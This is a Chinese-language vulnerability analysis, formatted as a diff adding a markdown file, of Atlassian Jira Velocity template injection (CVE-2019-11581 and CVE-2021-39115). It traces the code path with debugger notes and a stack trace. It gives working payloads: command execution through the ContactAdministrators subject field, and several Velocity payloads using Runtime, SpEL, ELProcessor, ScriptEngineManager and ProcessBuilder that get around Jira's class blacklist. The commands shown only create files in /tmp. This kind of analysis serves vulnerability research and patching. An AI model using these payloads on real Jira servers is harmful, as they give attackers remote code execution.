@@ -1,0 +1,155 @@
+# Atlassian JIRA服务器模板注入漏洞分析及挖掘
+## 一、漏洞复现及修复
+先围绕CVE-2019-11581漏洞展开。用qq搭建一个smtp服务器。记得把@qq.com在用户名那边删去。
+然后把联系管理员表单开启：
+但是后面看了一下，没有正确配置`SMTP`服务会抛出异常，但在连接`SMTP`服务之前漏洞已经触发了
+2、poc
+    url路径：/secure/ContactAdministrators!default.jspa 
+    $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('touch /tmp/success').waitFor()
+因为我是mac的机器，所以使用touch创建一个文件。
+atlassian家族产品的技术文档，以ActionContext为例，是将web线程上下文注入进这个对象，
+总的分发器dispatcher是叫做JiraWebworkActionDispatcher，他分给到了一个通用分发器去做派发任务。
+一个分发器里面存在的一些变量，选中的那行就是上下文对象，到时候看看这个对象是在哪生成的，什么时候生成的。
+这里将获取或者设置属性的类叫做属性描述器，通过获取action类及其所有父类里面String类型的小写变量，get，set方法，以及需要设置的变量属性放在一个描述器当中。
+往后看，这里第一个参数代表着我发送邮件的主题是`1`
+对action赋值完毕就是执行这个action类
+只要存在管理员账号并且不是失效状态的，就进入sendMail，第二个箭头是模版渲染，漏洞的重点触发点就在这个函数上
+流程走完后会有schedulerqueuework去唤醒发送邮件的任务
+进入`com.atlassian.jira.mail.builder.EmailRenderer#renderEmailBody`  
+赋值的时候是将这些变量传入
+最终在ast reference中递归执行。看到第一百一十行，那里就是具体调用的链。
+跟进来：
+可以看到方法在这里被反射调用。
+## 二、 疑问
+### 1、为什么subject可以被当作模版来解析？
+我们可以看到在制作item对象(`com.atlassian.jira.mail.builder.EmailBuilder类`)的时候，suubjectTemplate就已经是Fragment类了。所以后面fragment会从content里面取字段来进行解析的。file是按照文件的配置来进行解析，所以有个path，如果我们改写这个path同样会存在模版注入的问题。
+我们再把对item赋值的这行单独拎出来看：
+    MailQueueItem item = (new EmailBuilder(email, this.getMimeType(administrator), I18nBean.getLocaleFromUser(administrator))).withSubject(this.subject).withBodyFromFile(this.getTemplateDirectory(administrator) + "contactadministrator.vm").addParameters(velocityParams).renderLater();
+可以看到我们是在什么时候进行的赋值，再new完一个`EmailBuilder`之后，进行了两次`withxxx`的操作，其实就是set操作完之后再将这个对象返回，达到继续跟方法的目的。我们从`withSubject`方法中间分开左右两边看，左边主要是对象的生成。右边就是赋值和创建`RenderingMailQueueItem`的开始。直接从后半部分开始说，这里`withSubject`方法的入参是我们在填写发件主题时候的String类型字符串`$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('touch
+/tmp/success').waitFor()`。`withBodyFromFile`就是配置加上一个字符串。
+再看后面俩函数，赋值了一个hashmap，并重新创建了一个对象
+### 2、 如何从邮件body触发模版注入漏洞
+这个漏洞的本质就是`CVE-2021-39115`，有兴趣的可以去看看，漏洞的成因是使用Jira
+Administrator权限去覆盖vm文件，并在vm文件当中填入payload完成漏洞的触发。
+文件路径在`/jira/atlassian-jira-software-8.2.2-standalone/atlassian-jira/WEB-INF/classes/templates/email/html/includes/header.vm`，因为邮件服务的模版里面包含了这个文件，所以我们在文件中加入`CVE-2021-39115`的poc即可。然后随便发一封邮件，就可以触发poc。
+    #set($SpelExpressionParser = $jirautils.loadComponent('org.springframework.expression.spel.standard.SpelExpressionParser',$i18n.getClass()))
+        $SpelExpressionParser.parseRaw("T(java.lang.Runtime).getRuntime().exec('touch /tmp/success4')").getValue()
+### 3、为什么常规的payload不行
+    #set($x=$i18n.getClass())
+        #set($rt=$x.class.forName('java.lang.Runtime'))
+        #set($chr=$x.class.forName('java.lang.Character'))
+        #set($str=$x.class.forName('java.lang.String'))
+        #set($ex=$rt.getRuntime().exec('touch /tmp/success66'))   
+        $ex.waitFor()
+这个是velocity模版注入的常规payload，但是如果我们把他放到header.vm文件当中去，可以发现无法触发这个payload。然后我们去邮件看看
+直接把断点下在这两行，然后顺着堆栈往上找：
+可以看到在这里面去寻找方法的时候，method传入的是空，所以报错也是空指针异常。
+向上再去找在哪里生成的这个空参数，并将这个空参数传入`com.atlassian.velocity.htmlsafe.introspection.ReturnValueAnnotator#getAnnotationsForMethod`函数
+一路往下跟，虽然缓存中是存在Runtime类的，但是在返回Class类的时候，调用getClass()方法返回Class类
+所以在Class类中去寻找getRuntime方法是不可能的。
+用代码简述一下：
+    Class test = Runtime.class;
+            System.out.println(test.getClass()); //返回class java.lang.Class
+            Class test = Runtime.class;
+            System.out.println(test); //返回 class java.lang.Runtime
+            Object test = Runtime.getRuntime();
+            System.out.println(test.getClass()); ////返回 class java.lang.Runtime
+所以当我们使用新生成的类的时候，缓存中只有Class类，所以在此情况下只有注入Object
+Bean对象才可以使用调用相应的方法。所以反射的基础知识引出来了，如何通过反射创建新的类事例。1、新Object对象的生成在模版注入里面通过类的newInstance
+可以。可惜Runtime的构造方法是私有的，只能通过getRuntime来获取实例对象。
+2、所以我们使用Constructor来获取构造器，并将访问的属性设置为true。
+    通过反射创建新的类实例的两种方式:
+    Class.newInstance() 
+    Constructor.newInstance() 
+    所以runtime类我们可以改写成：
+        #set($x=$i18n.getClass())
+        #set($runcls=$x.class.forName("java.lang.Runtime"))
+        #set($runcon=$runcls.getDeclaredConstructor())
+        $runcon.setAccessible(true)
+        $runcon.newInstance().exec("touch /tmp/successRt")
+所以我们可以采用其他的方式进行注入，如spel，因为jira是tomcat服务启动的，也可以采用scriptengine的方式。  
+黑名单类
+    webwork.util.ValueStack,\
+    javax.el.ELProcessor,\
+    javax.script.ScriptEngineManager,\
+    java.lang.ProcessBuilder,\
+    javax.el.ImportHandler,\
+    javax.el.ELManager
+这里列举了以上黑名单类在vm模版引擎中的利用
+模版引擎的基本语法参考  
+    ELProcessor:
+        #set($x=$i18n.getClass())
+        #set($el=$x.class.forName("javax.el.ELProcessor").newInstance())
+        $el.eval('Runtime.getRuntime().exec("touch /tmp/successELProcessor")')
+    ScriptEngineManager:
+    noshorn:
+        #set($x=$i18n.getClass())
+        #set($semcls=$x.class.forName("javax.script.ScriptEngineManager"))
+        #set($sem=$semcls.newInstance())
+        $sem.getEngineByName("noshorn").eval("java.lang.Runtime.getRuntime().exec('touch /tmp/successSEM\');")
+    javascript:
+        #set($x=$i18n.getClass())
+        #set($semcls=$x.class.forName("javax.script.ScriptEngineManager"))
+        #set($sem=$semcls.newInstance())
+        $sem.getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('touch /tmp/successSEM\');")
+    java.lang.ProcessBuilder:
+    我本来写的第一种方法，但是newInstance这里是不存在空的构造方法的。
+        #set($x=$i18n.getClass())
+        #set($pb=$x.class.forName("java.lang.ProcessBuilder").newInstance())  
+        $pb.command("/bin/sh","-c","touch /tmp/successPB")
+        $pb.start()
+    改进之后：
+        #set($x=$i18n.getClass())
+        #set($list=$x.class.forName("java.util.List"))
+        #set($pbcls=$x.class.forName("java.lang.ProcessBuilder"))
+        #set($pbcon=$pbcls.getDeclaredConstructor($list))
+        #set($alistcls=$x.class.forName("java.util.ArrayList"))
+        #set($arrtest=["/bin/sh","-c","touch /tmp/successPB"])
+        #set($pb=$pbcon.newInstance($arrtest))
+        $pb.start()
+    javax.el.ImportHandler:
+    javax.el.ELManager:
+### 4、 其他触发方式
+甚至不需要在发送邮件的时候时候才能够触发模版引擎，测试的过程中一不小心断点没有mute，在访问邮件发送的页面时，发现也是模版引擎渲染的。
+于是我将payload放置在`atlassian-jira/WEB-INF/classes/templates/plugins/footer/footer.vm`里面，发现了这样有趣的事，我才意识到。在登陆页面的页脚也同样会触发。
+    execute:140, ASTMethod (org.apache.velocity.runtime.parser.node)
+    execute:262, ASTReference (org.apache.velocity.runtime.parser.node)
+    render:342, ASTReference (org.apache.velocity.runtime.parser.node)
+    render:336, SimpleNode (org.apache.velocity.runtime.parser.node)
+    render:1276, RuntimeInstance (org.apache.velocity.runtime)
+    evaluate:1215, RuntimeInstance (org.apache.velocity.runtime)
+    evaluate:1164, RuntimeInstance (org.apache.velocity.runtime)
+    evaluate:219, VelocityEngine (org.apache.velocity.app)
+    writeEncodedBodyForContent:86, DefaultVelocityManager (com.atlassian.velocity)
+    toWriterImpl:129, DefaultVelocityTemplatingEngine$DefaultRenderRequest (com.atlassian.jira.template.velocity)
+    asPlainText:108, DefaultVelocityTemplatingEngine$DefaultRenderRequest (com.atlassian.jira.template.velocity)
+    with:92, DefaultVelocityTemplatingEngine$DefaultRenderRequest$1 (com.atlassian.jira.template.velocity)
+    toString:77, DefaultVelocityTemplatingEngine$DefaultRenderRequest$StringRepresentation (com.atlassian.jira.template.velocity)
+    asPlainText:94, DefaultVelocityTemplatingEngine$DefaultRenderRequest (com.atlassian.jira.template.velocity)
+    getPlainText:90, JiraWebFragmentHelper (com.atlassian.jira.plugin.webfragment)
+    renderVelocityFragment:84, JiraWebFragmentHelper (com.atlassian.jira.plugin.webfragment)
+    getAccessKey:60, DefaultWebLink (com.atlassian.plugin.web.model)
+    getAccessKey:66, JiraWebLink (com.atlassian.jira.plugin.webfragment.model)
+    apply:329, DefaultWebInterfaceManager$WebItemConverter (com.atlassian.plugin.web)
+    apply:288, DefaultWebInterfaceManager$WebItemConverter (com.atlassian.plugin.web)
+    transform:785, Iterators$6 (com.google.common.collect)
+    next:47, TransformedIterator (com.google.common.collect)
+    addAll:358, Iterators (com.google.common.collect)
+    newArrayList:147, Lists (com.google.common.collect)
+    newArrayList:133, Lists (com.google.common.collect)
+    getDynamicWebItems:229, DefaultWebInterfaceManager (com.atlassian.plugin.web)
+    getDisplayableWebItems:212, DefaultWebInterfaceManager (com.atlassian.plugin.web)
+    getLinksForSection:120, DefaultSimpleLinkManager (com.atlassian.jira.plugin.webfragment)
+    access$701:28, ThreadLocalCachingSimpleLinkManager (com.atlassian.jira.plugin.webfragment)
+    load:149, ThreadLocalCachingSimpleLinkManager$3 (com.atlassian.jira.plugin.webfragment)
+    load:146, ThreadLocalCachingSimpleLinkManager$3 (com.atlassian.jira.plugin.webfragment)
+    loadFuture:3528, LocalCache$LoadingValueReference (com.google.common.cache)
+    loadSync:2277, LocalCache$Segment (com.google.common.cache)
+    lockedGetOrLoad:2154, LocalCache$Segment (com.google.common.cache)
+    get:2044, LocalCache$Segment (com.google.common.cache)
+    get:3952, LocalCache (com.google.common.cache)
+    getOrLoad:3974, LocalCache (com.google.common.cache)
+    get:4958, LocalCache$LocalLoadingCache (com.google.common.cache)
+    getUnchecked:4964, LocalCache$LocalLoadingCache (com.google.common.cache)
+    getLinksForSection:153, ThreadLocalCachingSimpleLinkManager (com.atlassian.jira.plugin.webfragment)
+    getLinksForSection:140, ThreadLocalCachingSimpleLinkManager (com.atlassian.jira.plugin.webfragment)
